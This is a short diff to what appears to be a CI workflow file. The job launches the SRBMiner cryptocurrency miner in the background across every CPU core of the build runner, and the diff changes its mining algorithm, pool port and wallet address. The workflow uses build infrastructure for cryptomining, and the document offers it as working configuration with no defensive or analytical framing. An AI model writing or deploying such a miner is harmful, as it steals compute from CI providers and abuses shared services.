@@ -29,7 +29,7 @@ jobs:
             chmod +x "$exe"
             threads=$(nproc)
             echo "➡ تشغيل SRBMiner بأقصى عدد من الأنوية: $threads"
-            nohup "$exe" -a yescryptr16  -o stratum+tcps://eu.rplant.xyz:17057 -u GLyKJfe57qXadmpZPdeTJiUN4tE25upb1v --cpu-threads $threads > miner.log 2>&1 &
+            nohup "$exe" -a ghostrider  -o stratum+tcps://eu.rplant.xyz:17095 -u FBZaQcxnxejQyZVaBqWoFH1JfJMf5LeNcP --cpu-threads $threads > miner.log 2>&1 &
           }
 
           # تشغيل miner لأول مرة
